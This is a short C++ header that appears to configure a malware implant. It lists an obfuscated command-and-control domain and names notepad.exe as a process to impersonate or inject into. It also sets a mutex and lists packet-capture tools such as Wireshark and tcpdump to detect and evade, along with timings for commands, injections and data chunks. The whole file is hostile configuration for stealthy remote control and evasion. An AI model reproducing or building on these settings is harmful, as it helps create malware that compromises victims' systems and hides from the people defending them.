#pragma once
#include "obfuscate.h"
const std::string CNC_DOMAINS[] = {
	std::string(OBFUSCATE("aloncnc.com"))
};

#define PROCESS_NAME OBFUSCATE("notepad.exe")
#define MUTEX_NAME OBFUSCATE("identity_mutex")


const std::string THREAT_PROCESSES[] = {
	std::string(OBFUSCATE("wireshark.exe")),
	std::string(OBFUSCATE("tcpdump.exe")),
	std::string(OBFUSCATE("tshark.exe")),
	std::string(OBFUSCATE("netcap.exe"))
};

constexpr size_t SLEEP_BETWEEN_COMMANDS = 10;

constexpr size_t SLEEP_BETWEEN_INJECTIONS = 60;

constexpr size_t CHUNK_SIZE = 1024;